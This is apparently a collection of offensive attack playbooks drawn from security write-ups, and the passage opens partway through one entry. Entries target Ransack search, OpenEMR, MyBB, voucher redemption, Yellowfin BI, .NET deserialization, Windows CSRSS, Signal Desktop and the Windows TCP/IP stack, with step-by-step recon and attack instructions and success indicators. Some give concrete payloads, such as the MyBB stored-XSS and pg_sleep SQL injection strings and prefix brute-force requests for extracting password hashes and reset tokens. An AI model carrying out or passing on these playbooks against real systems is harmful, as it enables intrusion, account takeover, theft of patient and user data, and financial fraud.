skip_if: The Ransack version is 4.0.0 or later, as it enforces allow-lists by default.
All search queries return an error or a generic 'not found' response, indicating strict input validation.
WAF blocks requests containing Ransack search matcher syntax.

recon_steps: Step 1: Identify potential search endpoints (e.g., /search, /products, /users) by observing GET requests and analyzing application behavior.
Step 2: Send requests to identified endpoints with a 'q' parameter and observe the response structure to confirm Ransack usage (e.g., 'q[attribute_eq]=value').
attack_steps: Step 1: Craft a GET request to a search endpoint, e.g., <TARGET_URL>/search?q[<ATTRIBUTE>_cont]=a
Step 2: Analyze the response. If any results are returned, incrementally increase the length of the guessed prefix for the target attribute (e.g., 'aa', 'aaa').
Step 3: If no results are returned for a given prefix, try the next character in the alphabet or known character set for that position.
Step 4: Continue this process until the full attribute value is exfiltrated character by character.
Step 5: Repeat for other sensitive attributes (e.g., email, password hash, reset token).
payloads_or_patterns: GET <TARGET_URL>/search?q[<ATTRIBUTE>_cont]=a
GET <TARGET_URL>/search?q[<ATTRIBUTE>_cont]=aa
GET <TARGET_URL>/search?q[<ATTRIBUTE>_cont]=aaa
tools_recommended: Burp Suite Repeater/Intruder: To automate the character-by-character guessing and track successful prefixes.
Custom scripting (Python/Ruby): To manage the brute-force logic and character sets for efficiency.
success_indicators: A successful brute-force attempt is indicated when the Ransack search returns at least one result for a specific character prefix, confirming that the guessed prefix is correct.
Successful exfiltration of sensitive data fields like email addresses, usernames, or password hashes.
failure_indicators: All attempts to guess character prefixes result in no records found. This indicates the guessed prefix is incorrect or the attribute is not vulnerable.

Responses consistently return 404, 500, or generic error messages, suggesting that the Ransack parameters are heavily sanitized or the application is not vulnerable in this manner. Pivot to checking for other Ransack search matchers or alternative injection techniques.

playbooks.impact: Exfiltration of sensitive user data such as email addresses, usernames, password hashes, or password reset tokens, leading to account takeover. In extreme cases, it could lead to full application compromise if administrative credentials are leaked.
playbooks.key_lesson: Always validate and sanitize user-provided search parameters, especially when using powerful query builders like Ransack. Enforce explicit attribute allow-lists to prevent brute-force attacks and sensitive data disclosure.

meta.title: OpenEMR - Remote Code Execution in your Healthcare System

trigger_conditions.when_to_apply: This technique is applicable when a web application, specifically OpenEMR in this context, has a vulnerability that allows for the injection and execution of arbitrary code on the server.
prerequisites: The target must be running an exploitable version of OpenEMR.
applicability_signals: The writeup mentions 'Remote Code Execution' as a known bug type for OpenEMR, implying such a vulnerability exists or has existed.
skip_if: The specific RCE vulnerability has been patched in the deployed version of OpenEMR.
No exploitable endpoints or functionalities are exposed.

recon_steps: Step 1: Identify the version of OpenEMR running on the target.
Step 2: Search for known RCE vulnerabilities specific to that OpenEMR version.
attack_steps: Step 1: Craft a malicious payload designed to exploit the identified RCE vulnerability.
Step 2: Inject the payload into the vulnerable component (e.g., a web form, API endpoint, or file upload functionality).
Step 3: Monitor the server for signs of code execution (e.g., shell access, file creation/modification, outbound network connections).
payloads_or_patterns: Insufficient detail in writeup (requires specific payload based on identified CVE)
tools_recommended: Burp Suite: For intercepting and modifying requests to inject payloads.
Metasploit Framework: For leveraging existing exploit modules or creating custom exploits.
Nmap: For initial reconnaissance and port scanning.
success_indicators: Reverse shell connection established.
Creation or modification of files on the server.
Execution of arbitrary commands on the server, with observable output or side effects.
failure_indicators: No shell access or command execution is observed.
The application returns an error message indicating an invalid request or input.
Intrusion detection systems or WAF block the request.

playbooks.impact: An attacker can gain complete control over the OpenEMR server, allowing them to access, modify, or delete sensitive patient data, disrupt healthcare services, or use the compromised server for further malicious activities.
playbooks.key_lesson: When targeting applications with known critical vulnerabilities like RCE, always prioritize identifying the specific version and researching documented exploits for that version.

meta.title: MyBB <= 1.8.31: Remote Code Execution Chain

tech_stack_fingerprints: HTTP responses containing MyBB-specific headers or HTML structure

trigger_conditions.when_to_apply: Applicable when a registered user can modify their signature and an administrator views user profiles or searches for users in the Admin CP, and the MyBB installation uses PostgreSQL.
prerequisites: Attacker has a registered user account.
Target MyBB installation uses PostgreSQL as the database.
Attacker needs to be able to reach the Admin CP user search functionality if targeting the SQLi -> RCE chain directly.
applicability_signals: The existence of the signature editing feature for registered users.
The existence of the Admin CP user search module (`/admin/index.php?module=user-users&action=search`).
Confirmation that the target database is PostgreSQL.
skip_if: MyBB version is 1.8.31 or higher (patched).
The target MyBB installation does not use PostgreSQL.

recon_steps: Step 1: Identify MyBB version by examining HTML source or HTTP headers for version-specific strings. Confirm it's <= 1.8.31.
Step 2: Attempt to modify user signature to check for XSS vulnerability. Look for successful alert() execution.
Step 3: Navigate to Admin CP user search (`/admin/index.php?module=user-users&action=search`) and identify custom fields like 'Bio'.
attack_steps: Step 1: As a low-privilege registered user, edit signature to include a stored XSS payload: `[email][email= onpointerover=alert()//]text[/email]`.
Step 2: Instruct an administrator (or an attacker-controlled admin account) to hover over the rendered signature text on a profile page to trigger the XSS.
Step 3: To achieve RCE via SQLi: As an administrator, search for users using the 'Bio' custom field.

Step 4: Intercept the search request and modify the `profile_fields[fid2]` parameter value to include an SQLi payload that leverages PostgreSQL's `pg_sleep` function to confirm time-based SQLi: `profile_fields[( select pg_sleep(5))::text = $quote$$quote$ and fid2 ]=My biography`.

Step 5: If time-based SQLi is confirmed, craft a multi-query payload targeting `pg_send_query` in `inc/db_pgsql.php` to achieve RCE. The exact payload depends on the desired command execution, but it would involve injecting a query that results in a system command execution.
payloads_or_patterns: XSS Payload: `[email][email= onpointerover=alert()//]text[/email]`
SQLi Payload (time-based confirmation): `profile_fields[( select pg_sleep(5))::text = $quote$$quote$ and fid2 ]=My biography`

RCE Payload (conceptual, requires adaptation): Payload to inject via SQLi that executes a system command through PostgreSQL's capabilities, e.g., using `COPY TO`/`FROM` or `lo_export`/`lo_import` in conjunction with `pg_read_file`/`pg_write_file` to create executable files, or leveraging `COPY TO` to write shell scripts.
tools_recommended: Burp Suite: For intercepting and modifying HTTP requests, particularly for SQLi payload crafting and testing.
Browser Developer Tools: To observe JavaScript execution for XSS and inspect response details.
success_indicators: XSS: JavaScript `alert()` box appears when hovering over the signature text in a moderator/admin view.
SQLi: A 5-second delay in the response when using the `pg_sleep(5)` payload in the user search.
RCE: Execution of a command on the server (e.g., writing a file, establishing a reverse shell) confirmed via the injected payload.
failure_indicators: XSS: No JavaScript execution upon hovering.
SQLi: No time delay observed, or generic error messages indicating invalid input but not the specific SQL error patterns.
RCE: Inability to craft a successful multi-query payload or the database engine preventing command execution.
If the target is not PostgreSQL, the SQLi to RCE chain will not work.

playbooks.impact: Attacker can achieve stored XSS against administrators, potentially leading to session hijacking or further compromise. Through SQL injection against administrators and a PostgreSQL backend, an attacker can achieve Remote Code Execution on the MyBB server, leading to full system compromise.
playbooks.key_lesson: Always investigate stored XSS vulnerabilities, especially in user-editable fields like signatures, as they can be escalated by higher-privileged users. Additionally, when MyBB uses PostgreSQL, SQL injection in admin functionalities can directly lead to RCE due to specific database function interactions.

meta.title: Easy 2000$ Race Condition

affected_components: Discount voucher redemption for team/tournament entry

trigger_conditions.when_to_apply: When discount vouchers are available with a limited quantity for team or tournament participation, and multiple user accounts can attempt to redeem them concurrently.
prerequisites: Attacker must have multiple authenticated user accounts.
Discount vouchers must be configured with a limited redemption count.
applicability_signals: A feature exists for applying discount vouchers to reduce entry fees.
The voucher redemption process is observable via network traffic.
skip_if: Voucher redemptions are processed server-side with strict rate limiting or atomic checks that prevent concurrent redemption.
The application requires multi-factor authentication for voucher redemption.

recon_steps: Step 1: Identify features related to team or tournament entry with associated fees.
Step 2: Observe the process of applying discount vouchers to these fees and analyze the network requests.
Step 3: Determine if voucher redemption involves a server-side counter or a client-side check that could be bypassed.
attack_steps: Step 1: Obtain multiple authenticated user accounts.
Step 2: Simultaneously trigger the voucher redemption process for the same voucher code from all attacker-controlled accounts.
Step 3: Monitor the results to see if the voucher's limited quantity is exceeded.
Step 4: If successful, proceed to exploit the unlimited voucher condition by registering for the tournament or team with multiple accounts using the same voucher.
payloads_or_patterns: Concurrent requests to the voucher redemption endpoint with the same voucher code from multiple sessions.
tools_recommended: Burp Suite Intruder: Configure to send the voucher redemption request from multiple threads simultaneously.
Custom script (e.g., Python with `requests` library): To orchestrate concurrent requests from multiple user sessions.
success_indicators: Multiple successful redemptions of a voucher with a limited quantity.
The entry fee becomes free or significantly discounted for multiple participants, exceeding the voucher's intended limit.
The system fails to prevent the voucher from being used more times than its configured limit.
failure_indicators: Subsequent redemption attempts after the limit is reached result in an error message (e.g., 'Voucher expired', 'Voucher limit reached').
The first attempt consumes the voucher and subsequent attempts fail, indicating a successful server-side check.

playbooks.impact: Financial loss for the organization due to unlimited free or discounted participation in tournaments or teams. Potential for abuse of the system by attackers to gain an unfair advantage or exploit the reduced costs.
playbooks.key_lesson: Always test voucher or coupon redemption mechanisms for race conditions by attempting concurrent redemption from multiple authenticated sessions to bypass quantity limitations.

meta.title: Jumping into SOCKS

affected_components: Internal network services requiring client SSL certificate authentication
tech_stack_fingerprints: Non-exportable client SSL certificate private key on Windows host

trigger_conditions.when_to_apply: When an internal API endpoint requires client SSL certificate authentication and the certificate's private key on the compromised host is marked as non-exportable, preventing direct import into tools like Burp Suite or Postman.
prerequisites: Attacker has low-privileged access to an internal Windows host.
The target API endpoint communicates over HTTPS and enforces client SSL certificate authentication.
The client SSL certificate on the compromised host has a non-exportable private key.
applicability_signals: Discovery of an internal HTTPS API endpoint.
Observation of client SSL certificate authentication enforcement for that endpoint.
Confirmation that the private key for the client SSL certificate on the host is marked as non-exportable.
skip_if: The client SSL certificate private key is exportable.
No internal HTTPS API endpoints requiring client SSL certificate authentication are identified.

recon_steps: Step 1: Identify internal HTTPS API endpoints on the target network.
Step 2: Attempt to access identified endpoints to determine authentication requirements.

Step 3: If client SSL certificate authentication is required, attempt to export the certificate and its private key from the compromised Windows host. Check the 'Allow private key to be exported' checkbox in the certificate export wizard.
Step 4: If the private key is found to be non-exportable, this technique becomes applicable.
attack_steps: Step 1: Develop or deploy a custom SOCKS proxy on the compromised Windows host.
Step 2: Configure the SOCKS proxy to listen for client connections.
Step 3: Implement logic within the SOCKS proxy to handle SOCKS negotiation for destination IP and port.
Step 4: Implement logic to detect if the client connection is TLS or cleartext.
Step 5: If TLS, configure the proxy to use a self-signed certificate for the connection with the originating client.
Step 6: Configure the proxy to use SNI data (or another method) to negotiate a connection with the remote endpoint, incorporating the non-exportable client SSL certificate.
Step 7: Configure tools like Burp Suite or Postman to proxy traffic through the deployed SOCKS proxy.
payloads_or_patterns: Custom C# SOCKS proxy implementation (details in writeup, not a direct payload).
tools_recommended: Custom C# SOCKS proxy
Burp Suite (configured to use the SOCKS proxy)
Postman (configured to use the SOCKS proxy)
success_indicators: Successful establishment of a connection to the internal API endpoint via the SOCKS proxy, bypassing the non-exportable private key restriction.
Successful authentication and interaction with the API endpoint using the client SSL certificate managed by the SOCKS proxy.
failure_indicators: SOCKS proxy fails to start or crashes (check C# implementation and .NET framework compatibility).
Connections to the target API endpoint fail with TLS errors or authentication failures (verify SNI handling and client certificate integration in the proxy).
Network connectivity issues between the compromised host and the target API endpoint.

playbooks.impact: Allows an attacker to authenticate to internal API endpoints that require client SSL certificates, even when the certificate's private key is non-exportable, enabling access to sensitive internal resources or functionality.
playbooks.key_lesson: When faced with non-exportable client SSL certificates, consider implementing a custom SOCKS proxy on the compromised host that leverages the Windows Crypto API to facilitate authenticated connections to the target service.

meta.title: Exploiting Hardcoded Keys to achieve RCE in Yellowfin BI

trigger_conditions.when_to_apply: This playbook is applicable when analyzing the source code of Yellowfin BI (or similar Java monolith applications) and identifying hardcoded keys used in authentication-related functionalities.
prerequisites: Access to Yellowfin BI source code.
Identification of hardcoded keys used for encrypting/decrypting authentication data.
applicability_signals: Source code contains hardcoded keys (e.g., encryption keys, secret keys).
Application uses Java.
The authentication flow involves encrypting/decrypting session data or tokens.
skip_if: No hardcoded keys are found in the authentication logic.
The application does not use Java.

recon_steps: Step 1: Analyze Yellowfin BI Java source code, focusing on authentication modules, session management, and token handling.
Step 2: Search for hardcoded string literals that appear to be cryptographic keys, secrets, or initialization vectors.
attack_steps: Step 1: Identify the specific hardcoded key used for encrypting/decrypting authentication-related data (e.g., session data, JWTs).
Step 2: Understand the encryption/decryption algorithm and implementation used by the application.
Step 3: If possible, leverage the identified hardcoded key to craft malicious authentication data (e.g., forge a valid session token or JWT).
Step 4: Inject the crafted malicious data into the application's authentication flow to bypass authentication.
Step 5: Once authenticated, explore the application for functionalities that allow command execution or code injection, potentially using the context of the bypassed authentication.
payloads_or_patterns: Example of a hardcoded key (hypothetical): "com.yellowfin.security.secretKey = MY_SUPER_SECRET_KEY_123"
If a hardcoded key is found, investigate how it's used in Java code for `Cipher.getInstance()`, `SecretKeySpec`, or similar cryptographic operations.
tools_recommended: IDE with code search capabilities (e.g., IntelliJ IDEA, VS Code) for source code analysis.
Decompilers for Java bytecode if source code is unavailable.
Burp Suite or similar proxy to intercept and manipulate HTTP requests.
Custom scripts (Python, Java) to automate key extraction, payload generation, and exploitation.
success_indicators: Successful authentication without valid credentials.
Access to administrative functionalities or sensitive data.
Execution of arbitrary commands on the target server (e.g., `whoami`, `ls` commands returning expected output).
failure_indicators: Authentication bypass attempts are rejected with invalid token errors or access denied.
Application does not respond as expected to crafted payloads.
No observable RCE or unauthorized access is achieved after bypassing authentication. Pivot to other vulnerabilities or different hardcoded keys if present.

playbooks.impact: Remote Code Execution (RCE) on the Yellowfin BI server, leading to complete compromise of the system, data exfiltration, or further lateral movement within the network.
playbooks.key_lesson: Relying on hardcoded secrets in source code is a critical security risk; always ensure sensitive keys and credentials are dynamically managed and never embedded directly.

meta.title: CVE from 2018 Strikes Again

tech_stack_fingerprints: Presence of desktop application launched via a unique link after web login

trigger_conditions.when_to_apply: When an authenticated user can launch a desktop application from a web application, and the desktop application communicates with the server using serialized .NET objects.
prerequisites: User must be able to log into the web application.
Desktop application must be launched by the user.
Desktop application communicates with the server via serialized .NET objects.
applicability_signals: Desktop login response contains a base64 string with encrypted data.
Reviewing desktop application source code reveals use of .NET serialization (e.g., BinaryFormatter).
Network traffic analysis (if possible) shows serialized .NET objects.
Server responses contain stack traces mentioning BinaryServerFormatterSink.
skip_if: Desktop application's network traffic is not encrypted or compressed.
Desktop application does not use .NET serialization.
Server-side validation strictly checks for serialized .NET object structure and prevents manipulation.

recon_steps: Step 1: Log into the web application and observe the process of launching the desktop application. Capture the base64 string returned after the desktop login.
Step 2: Analyze the desktop application's source code (if available) to understand how it handles and serializes data.
Step 3: Identify the serialization method used (e.g., BinaryFormatter) and any encryption/compression mechanisms applied to the payload.
attack_steps: Step 1: Extract the AES key and IV from the base64 string obtained during the desktop login process.
Step 2: Construct a malicious .NET serialized object using a known vulnerable gadget chain (e.g., from ModZero's research on BinaryServerFormatterSink).
Step 3: Encrypt the crafted serialized object using the extracted AES key and IV.
Step 4: Re-encode the encrypted data into a base64 string.
Step 5: Craft an HTTP request to the server, mimicking the communication from the desktop application, and include the malicious base64 string.
Step 6: Send the crafted request and monitor for a response indicating code execution (e.g., a stack trace with command output).
tools_recommended: ILSpy: For analyzing desktop application's C# source code.
Burp Suite: For intercepting and modifying HTTP requests, and for hosting a listener (e.g., Burp Collaborator) for exfiltrated data.
C# compiler: For compiling PoC code.
ysoserial.net or similar: For generating .NET deserialization gadgets.
success_indicators: Response containing a stack trace with output from the executed command (e.g., environment variables, AWS keys, AWS EC2 user data).
Callback received at the attacker-controlled server (e.g., Burp Collaborator) containing exfiltrated data.
failure_indicators: Receiving a generic error message or a 4xx/5xx status code without command output: Indicates potential WAF blocking or incorrect payload construction. Try obfuscating the payload or using a different gadget chain.
No response or a connection refused error: Suggests incorrect endpoint or protocol. Re-verify desktop application's communication with the server.
Encrypted traffic that cannot be decrypted with the extracted key/IV: Indicates a mismatch or a different encryption scheme. Re-examine the key/IV extraction process.

playbooks.impact: Remote Code Execution (RCE) on the server, allowing an attacker to: execute arbitrary commands, access sensitive data (environment variables, AWS credentials, plaintext user data), and potentially gain further control over the compromised infrastructure.
playbooks.key_lesson: Always investigate the handling of serialized objects, especially in legacy applications or those with complex client-server interactions, as .NET deserialization vulnerabilities remain a potent RCE vector.

meta.title: Activation Context Cache Poisoning: Exploiting CSRSS For Privilege Escalation

trigger_conditions.when_to_apply: This technique is applicable on vulnerable versions of Microsoft Windows where the CSRSS process's activation context cache can be poisoned by a low-privilege process.
prerequisites: Attacker has a low-privilege user context on the target Windows machine.
applicability_signals: Observation of specific vulnerabilities (CVE-2022-22047, CVE-2022-37987, CVE-2022-37989) affecting CSRSS.
The target system is running a vulnerable version of Windows.
skip_if: The target system has been patched against the identified CSRSS vulnerabilities.

recon_steps: Step 1: Identify the version of Windows running on the target. This can be done through system information tools or registry queries.
Step 2: Cross-reference the Windows version with known vulnerable versions to confirm the presence of CSRSS-related privilege escalation vulnerabilities.
attack_steps: Step 1: Craft a malicious DLL and a corresponding manifest file designed to exploit the activation context cache poisoning vulnerability.
Step 2: Develop a method to trigger the CSRSS process to load the malicious DLL. This might involve specific API calls or triggering certain system events.
Step 3: Execute the exploit from a low-privilege user context. The goal is to trick CSRSS into using the attacker-controlled DLL during its activation context resolution.
Step 4: Once CSRSS loads the malicious DLL, it will execute with elevated privileges, allowing the attacker to perform further actions like escalating to SYSTEM.
Step 5: Leverage the elevated privileges to achieve desired outcomes (e.g., dumping credentials, establishing persistence).
payloads_or_patterns: Malicious DLL file (e.g., `evil.dll`)
XML manifest file (e.g., `evil.manifest`)
Code to trigger LoadLibrary or similar API calls in a way that interacts with CSRSS.
Exploit proof-of-concept code that manipulates the activation context cache.
tools_recommended: C/C++ compiler (e.g., Visual Studio) for DLL and exploit code development.
Sysinternals Suite for system analysis and debugging.
Windows Debugger (WinDbg) for in-depth debugging of CSRSS and kernel components.
success_indicators: The attacker's process gains SYSTEM privileges.
Successful execution of commands requiring elevated privileges (e.g., `net group "Domain Admins"`).
Evidence of the malicious DLL being loaded by CSRSS (e.g., via process monitoring tools).
failure_indicators: The exploit fails to elevate privileges, and the attacker's process remains at the original privilege level.
CSRSS crashes or becomes unstable, indicating a potential instability in the exploit rather than successful privilege escalation.
Security software detects and blocks the malicious DLL or exploit attempt (e.g., AV alerts, EDR blocking actions).

playbooks.impact: Attacker achieves SYSTEM-level privileges on the target Windows machine, enabling full control over the system, data exfiltration, persistence, and lateral movement within the network.
playbooks.key_lesson: Low-privilege processes can sometimes influence or be leveraged by critical system processes like CSRSS, leading to privilege escalation. Always investigate how system components resolve dependencies and load external code.

meta.title: CVE-2023-24068 && CVE-2023-24069: Abusing Signal Desktop Client for fun and for Espionage
meta.category: Thick client, Insecure data storage, Local Privilege Escalation

trigger_conditions.when_to_apply: When an attacker has local access to a target's machine running Signal Desktop <= 6.2.0.
prerequisites: Attacker has local host access.
applicability_signals: Signal Desktop client is installed and running.
User has sent or received attachments in Signal.
The 'attachments.noindex' directory exists and contains files.
skip_if: Signal Desktop client is updated beyond version 6.2.0.

recon_steps: Step 1: Identify the Signal attachments directory on the target's file system. On Windows, this is typically 'C:\Users\<USER>\AppData\Roaming\Signal\attachments.noindex\'. On Linux, it's '~/.config/Signal/attachments.noindex/'.
Step 2: List files within the 'attachments.noindex' directory and its subdirectories to identify potential sensitive attachments.
attack_steps: Step 1: Locate an attachment file in the 'attachments.noindex' directory that the target user has sent or received.
Step 2: If the attachment was replied to in a conversation, the file might not be purged even after deletion. Attempt to access and recover such files.
Step 3: (CVE-2023-24068) Identify an existing attachment file in the 'attachments.noindex' directory.
Step 4: (CVE-2023-24068) Replace the content of the identified attachment file with malicious code or content (e.g., a different image).
Step 5: (CVE-2023-24068) Observe the Signal Desktop client's behavior when the user attempts to access the replaced attachment (e.g., by downloading it from the chat).
Step 6: (CVE-2023-24069) Send or receive an attachment in a Signal conversation.
Step 7: (CVE-2023-24069) Delete the attachment from the chat.
Step 8: (CVE-2023-24069) Check the 'attachments.noindex' directory for the presence of the 'deleted' file. If it exists, it is vulnerable to cleartext storage.
Step 9: (CVE-2023-24069) Recover the 'deleted' file by potentially renaming its extension (e.g., to .png for an image).
payloads_or_patterns: Replace original attachment file content with arbitrary data.
Recover files by changing extensions (e.g., add .png).
tools_recommended: File system explorer (e.g., Windows Explorer, Nautilus)
Command-line interface (e.g., cmd, PowerShell, Bash) for file manipulation.
success_indicators: Sensitive attachments (images, documents, etc.) are found unencrypted in the 'attachments.noindex' directory.
Replaced attachment file content is displayed to the user when they attempt to access the original attachment via the Signal client.
failure_indicators: The 'attachments.noindex' directory is empty or does not exist.
Files in 'attachments.noindex' are encrypted (indicating a patched version or different storage mechanism).
Replacing an attachment file does not alter the content displayed to the user in the Signal client.

playbooks.impact: An attacker with local access can retrieve sensitive attachments from Signal conversations, even if they were deleted, or potentially replace existing attachments with malicious content, leading to information disclosure or further system compromise.
playbooks.key_lesson: Always investigate local file storage mechanisms for sensitive data in desktop applications, especially when encryption is expected but potentially mishandled.

meta.title: Dissecting and Exploiting TCP/IP RCE Vulnerability “EvilESP”

trigger_conditions.when_to_apply: When the target is running a vulnerable version of Microsoft Windows and the TCP/IP stack is accessible over the network.
prerequisites: Target is running a vulnerable version of Microsoft Windows.
TCP/IP stack is exposed to network traffic.
applicability_signals: insufficient detail in writeup
skip_if: Target is not running Microsoft Windows.
Network traffic to the TCP/IP stack is blocked by a firewall.

recon_steps: Step 1: Identify the operating system and version of the target machine using network scanning tools (e.g., Nmap) and check for known vulnerabilities related to its TCP/IP stack.
Step 2: Confirm the specific version of the Windows OS to match with known "EvilESP" exploit details.
attack_steps: Step 1: Craft a malicious network packet that exploits the "EvilESP" vulnerability in the TCP/IP stack.
Step 2: Send the crafted packet to the target machine's IP address.
Step 3: Monitor for signs of successful Remote Code Execution (RCE).
payloads_or_patterns: insufficient detail in writeup - Requires specific packet crafting based on 'EvilESP' vulnerability details.
tools_recommended: Nmap for OS fingerprinting and vulnerability scanning.
Custom exploit script or tool capable of crafting and sending the 'EvilESP' payload.
success_indicators: Successful execution of arbitrary code on the target machine.
Establishment of a reverse shell or command execution confirmation.
failure_indicators: Packet is dropped by a firewall.
Target machine crashes or becomes unresponsive without code execution.
No observable signs of code execution after sending the payload.

playbooks.impact: Remote Code Execution (RCE) on the target Microsoft Windows machine, allowing an attacker to take full control of the system.
playbooks.key_lesson: Vulnerabilities in core network protocols like TCP/IP can lead to severe RCE flaws, requiring deep understanding of low-level network stack behavior for both defense and exploitation.
